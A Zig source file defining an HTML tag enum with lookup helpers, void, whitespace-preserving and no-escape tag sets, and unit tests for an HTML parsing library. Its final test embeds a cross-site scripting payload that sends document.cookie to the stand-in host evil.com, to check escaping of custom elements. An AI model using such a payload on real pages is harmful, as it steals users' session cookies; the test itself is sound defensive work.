//! Enum optimized HTML Tags

const std = @import("std");
const z = @import("../root.zig");

const testing = std.testing;
const print = std.debug.print;

/// [HtmlTag] Enum that represents the various HTML tags.
///
///  `self.toString` returns the tag name as a string.
///
/// `self.isVoid` checks if the tag is a self-closing element (e.g., `<br>`, `<img>`).
///
///  `self.isNoEscape` checks if the tag should not have its content escaped.
///
///
///
pub const HtmlTag = enum {
    custom,
    a,
    abbr,
    address,
    area,
    article,
    aside,
    audio,
    b,
    base,
    bdi,
    bdo,
    blockquote,
    body,
    br,
    button,
    canvas,
    caption,
    cite,
    code,
    col,
    colgroup,
    data,
    datalist,
    dd,
    del,
    details,
    dfn,
    dialog,
    div,
    dl,
    dt,
    em,
    embed,
    fieldset,
    figcaption,
    figure,
    footer,
    form,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    head,
    header,
    hgroup,
    hr,
    html,
    i,
    iframe,
    img,
    input,
    ins,
    kbd,
    label,
    legend,
    li,
    link,
    main,
    map,
    mark,
    menu,
    meta,
    meter,
    nav,
    noscript,
    object,
    ol,
    optgroup,
    option,
    output,
    p,
    picture,
    pre,
    progress,
    q,
    rp,
    rt,
    ruby,
    s,
    samp,
    script,
    section,
    select,
    slot,
    small,
    source,
    span,
    strong,
    style,
    sub,
    summary,
    sup,
    table,
    tbody,
    td,
    template,
    textarea,
    tfoot,
    th,
    thead,
    time,
    title,
    tr,
    track,
    u,
    ul,
    video,
    wbr,
    // SVG elements
    svg,
    circle,
    rect,
    path,
    line,
    text,
    g,
    defs,
    use,

    pub fn toString(self: @This()) []const u8 {
        return switch (self) {
            .custom => "custom",
            .a => "a",
            .abbr => "abbr",
            .address => "address",
            .area => "area",
            .article => "article",
            .aside => "aside",
            .audio => "audio",
            .b => "b",
            .base => "base",
            .bdi => "bdi",
            .bdo => "bdo",
            .blockquote => "blockquote",
            .body => "body",
            .br => "br",
            .button => "button",
            .canvas => "canvas",
            .caption => "caption",
            .cite => "cite",
            .code => "code",
            .col => "col",
            .colgroup => "colgroup",
            .data => "data",
            .datalist => "datalist",
            .dd => "dd",
            .del => "del",
            .details => "details",
            .dfn => "dfn",
            .dialog => "dialog",
            .div => "div",
            .dl => "dl",
            .dt => "dt",
            .em => "em",
            .embed => "embed",
            .fieldset => "fieldset",
            .figcaption => "figcaption",
            .figure => "figure",
            .footer => "footer",
            .form => "form",
            .h1 => "h1",
            .h2 => "h2",
            .h3 => "h3",
            .h4 => "h4",
            .h5 => "h5",
            .h6 => "h6",
            .head => "head",
            .header => "header",
            .hgroup => "hgroup",
            .hr => "hr",
            .html => "html",
            .i => "i",
            .iframe => "iframe",
            .img => "img",
            .input => "input",
            .ins => "ins",
            .kbd => "kbd",
            .label => "label",
            .legend => "legend",
            .li => "li",
            .link => "link",
            .main => "main",
            .map => "map",
            .mark => "mark",
            .menu => "menu",
            .meta => "meta",
            .meter => "meter",
            .nav => "nav",
            .noscript => "noscript",
            .object => "object",
            .ol => "ol",
            .optgroup => "optgroup",
            .option => "option",
            .output => "output",
            .p => "p",
            .picture => "picture",
            .pre => "pre",
            .progress => "progress",
            .q => "q",
            .rp => "rp",
            .rt => "rt",
            .ruby => "ruby",
            .s => "s",
            .samp => "samp",
            .script => "script",
            .section => "section",
            .select => "select",
            .slot => "slot",
            .small => "small",
            .source => "source",
            .span => "span",
            .strong => "strong",
            .style => "style",
            .sub => "sub",
            .summary => "summary",
            .sup => "sup",
            // SVG elements
            .svg => "svg",
            .circle => "circle",
            .rect => "rect",
            .path => "path",
            .line => "line",
            .text => "text",
            .g => "g",
            .defs => "defs",
            .use => "use",
            .table => "table",
            .tbody => "tbody",
            .td => "td",
            .template => "template",
            .textarea => "textarea",
            .tfoot => "tfoot",
            .th => "th",
            .thead => "thead",
            .time => "time",
            .title => "title",
            .tr => "tr",
            .track => "track",
            .u => "u",
            .ul => "ul",
            .video => "video",
            .wbr => "wbr",
        };
    }
    /// Check if this tag is a void  element
    pub fn isVoid(self: HtmlTag) bool {
        return VoidTagSet.contains(self);
    }
};

/// [HtmlTag] Convert string to enum (inline) with fallback to string comparison for custom elements
///
/// (`Zig` code: std.meta.stringToCode` with a higher limit).
pub fn stringToEnum(comptime T: type, str: []const u8) ?T {
    if (@typeInfo(T).@"enum".fields.len <= 120) {
        const kvs = comptime build_kvs: {
            const EnumKV = struct { []const u8, T };
            var kvs_array: [@typeInfo(T).@"enum".fields.len]EnumKV = undefined;
            for (@typeInfo(T).@"enum".fields, 0..) |enumField, i| {
                kvs_array[i] = .{ enumField.name, @field(T, enumField.name) };
            }
            break :build_kvs kvs_array[0..];
        };
        const map = std.StaticStringMap(T).initComptime(kvs);
        return map.get(str);
    } else {
        inline for (@typeInfo(T).@"enum".fields) |enumField| {
            if (std.mem.eql(u8, str, enumField.name)) {
                return @field(T, enumField.name);
            }
        }
        return null;
    }
}

/// [HtmlTag] Convert qualified name (lowercase) to HtmlTag enum
pub inline fn tagFromQualifiedName(qualified_name: []const u8) ?HtmlTag {
    // Fast path: try direct enum lookup (most common case - lowercase)
    if (stringToEnum(HtmlTag, qualified_name)) |tag| {
        return tag;
    }

    return null; // Unknown/custom element
}

test "tagFromQualifiedName" {
    try testing.expect(tagFromQualifiedName("div") == .div);
    try testing.expect(tagFromQualifiedName("span") == .span);
    try testing.expect(tagFromQualifiedName("unknown") == null);
    try testing.expect(tagFromQualifiedName("x-widget") == null);
    // namespaced
    try testing.expect(tagFromQualifiedName("svg") == .svg);
}

/// [HtmlTag] Convert element to HtmlTag enum
pub fn tagFromElement(element: *z.HTMLElement) ?HtmlTag {
    const qualified_name = z.qualifiedName_zc(element);
    return tagFromQualifiedName(qualified_name);
}

/// [HtmlTag] Convert any element (including custom) to HtmlTag enum
///
/// Custom elements are labelled `.custom`
pub fn tagFromAnyElement(element: *z.HTMLElement) HtmlTag {
    const qualified_name = z.qualifiedName_zc(element);
    return tagFromQualifiedName(qualified_name) orelse .custom;
}

test "tagFromElement & tagFromAnyElement" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const element = try z.createElement(doc, "div");
    try testing.expect(z.tagFromElement(element) == z.tagFromAnyElement(element));
    const custom_elt = try z.createElement(doc, "x-widget");
    try testing.expect(z.tagFromAnyElement(custom_elt) == .custom);
}

/// [HtmlTag] Set of void elements
pub const VoidTagSet = struct {
    /// Fast inline check if a tag is void
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .area, .base, .br, .col, .embed, .hr, .img, .input, .link, .meta, .source, .track, .wbr => true,
            else => false,
        };
    }
};

test "VoidTagSet" {
    try testing.expect(VoidTagSet.contains(.br));
    try testing.expect(VoidTagSet.contains(.img));
    try testing.expect(VoidTagSet.contains(.input));
    try testing.expect(!VoidTagSet.contains(.div));
}

test "self.toString vs tagFromQualifiedName, self.isVoid, self.isNoEscape" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const tags = [_]z.HtmlTag{ .div, .p, .span, .a, .img, .br, .script };

    for (tags) |tag| {
        const element = try z.createElement(doc, tag.toString());
        const node_name = z.nodeName_zc(z.elementToNode(element)); // UPPERCASE
        const expected_Html_tag_name = tag.toString();

        try testing.expect(tag == z.tagFromElement(element).?);

        if (tag == .br or tag == .img) {
            try testing.expect(tag.isVoid());
        } else if (tag == .script) {
            try testing.expect(!tag.isVoid());
        } else {
            try testing.expect(!tag.isVoid());
        }

        // Note: DOM names are typically uppercase
        try testing.expect(std.ascii.eqlIgnoreCase(expected_Html_tag_name, node_name));

        const expected_tag = tagFromQualifiedName(z.qualifiedName_zc(element)); // lowercase
        try testing.expect(tag == expected_tag);
    }
}

/// [HtmlTag] Tag name matcher function
pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
    const tag = z.tagFromElement(element);
    return tag == tagFromQualifiedName(tag_name);
}

test "matchesTagName" {
    const doc = try z.createDocFromString("<p></p><br>");
    const body_elt = z.bodyElement(doc).?;
    const p = z.firstElementChild(body_elt).?;
    const br = z.nextElementSibling(p).?;

    try testing.expect(z.matchesTagName(p, "p"));
    try testing.expect(!z.matchesTagName(br, "td"));
}

/// [HtmlTag] Set of whitespace preserved elements
pub const WhitespacePreserveTagSet = struct {
    /// Fast inline check if a tag is whitespace preserved
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .pre, .textarea, .script, .style => true,
            .code => true,
            else => false,
        };
    }
};

test "whitespacepreservedTagSet" {
    const allocator = testing.allocator;

    const doc = try z.createDocFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
    defer z.destroyDocument(doc);

    const body_elt = z.bodyElement(doc).?;

    const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
        .{ .tag = .div, .preserved = false },
        .{ .tag = .pre, .preserved = true },
        .{ .tag = .code, .preserved = true },
        .{ .tag = .textarea, .preserved = true },
        .{ .tag = .script, .preserved = true },
        .{ .tag = .style, .preserved = true },
        .{ .tag = .p, .preserved = false },
    };

    const children_elts = try z.children(allocator, body_elt);
    defer allocator.free(children_elts);

    for (children_elts, 0..) |elt, i| {
        const tag = z.tagFromQualifiedName(z.qualifiedName_zc(elt)).?;
        try testing.expect(expected[i].tag == tag);
        try testing.expect(expected[i].preserved == WhitespacePreserveTagSet.contains(tag));
    }
}

test "tagFromElement vs tagName vs qualifiedName allocated/zc" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const div = try z.createElement(doc, "div");
    const web_component = try z.createElement(doc, "x-widget");

    try testing.expect(z.tagFromElement(web_component) == null);
    try testing.expect(z.tagFromElement(div) == .div);

    try testing.expectEqualStrings("DIV", z.nodeName_zc(z.elementToNode(div)));
    try testing.expectEqualStrings("X-WIDGET", z.nodeName_zc(z.elementToNode(web_component)));
    try testing.expectEqualStrings("DIV", z.tagName_zc(div));
    try testing.expectEqualStrings("X-WIDGET", z.tagName_zc(web_component));

    // Test allocation
    const allocator = testing.allocator;

    // Allocating version (safe for long-term storage)
    const wc_qn = try z.qualifiedName(allocator, web_component);
    defer allocator.free(wc_qn);
    try testing.expectEqualStrings("x-widget", wc_qn);

    const div_tn = try z.tagName(allocator, div);
    defer allocator.free(div_tn);
    try testing.expectEqualStrings("DIV", div_tn);

    const wc_tn = try z.tagName(allocator, web_component);
    defer allocator.free(wc_tn);
    try testing.expectEqualStrings("X-WIDGET", wc_tn);
}

/// [HtmlTag] Set of tags that should not be escaped (modern approach)
pub const NoEscapeTagSet = struct {
    /// Fast inline check if a tag should not be escaped
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .script, .style, .iframe => true,
            else => false,
        };
    }
};

/// [HtmlTag] Check if element should not have its content escaped (string-based)
///
/// Only standard tags get `isNoEscape = true` (`.script`, `.style`, `.iframe`).
///
/// If returns false, it means the element is not a no-escape element so it should be escaped.
///
/// Same content "<script>alert('xss')</script>", different contexts:
///   1. Inside `<my-widget>`: ESCAPE, treat as text     → Safe display
///   2. Inside `<script>`: DON'T ESCAPE, treat as code  → Functional JavaScript
/// ## Example
/// ```
/// <my-widget>User typed: <script>alert('xss')</script></my-widget>
/// // should become:
/// <my-widget>&lt;script&gt;alert('xss')&lt;/script&gt;</my-widget>
/// //
/// <script>console.log("hello");</script>  ← Must NOT escape
/// <style>body { color: red; }</style>     ← Must NOT escape
/// <iframe src="..."></iframe>             ← Must NOT escape
///---
fn isNoEscapeElement(element: *z.HTMLElement) bool {
    const tag = tagFromElement(element) orelse return false;
    return NoEscapeTagSet.contains(tag);
}

test "custom elements security validation" {
    const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
    const doc = try z.createDocFromString(user_submitted_html);
    defer z.destroyDocument(doc);

    const body_elt = z.bodyElement(doc).?;
    const widget_elt = z.firstElementChild(body_elt).?;

    // Custom element should not be in standard HTML enum
    try testing.expectEqualStrings("custom-widget", z.qualifiedName_zc(widget_elt));
    try testing.expect(z.tagFromQualifiedName("custom-widget") == null);

    // Custom elements should not be treated as no-escape elements
    try testing.expect(!isNoEscapeElement(widget_elt));

    const widget_content = z.textContent_zc(z.elementToNode(widget_elt));

    // Verify malicious content is detected
    try testing.expect(
        std.mem.indexOf(u8, widget_content, "document.cookie") != null,
    );
    try testing.expect(
        std.mem.indexOf(u8, widget_content, "evil.com") != null,
    );
}
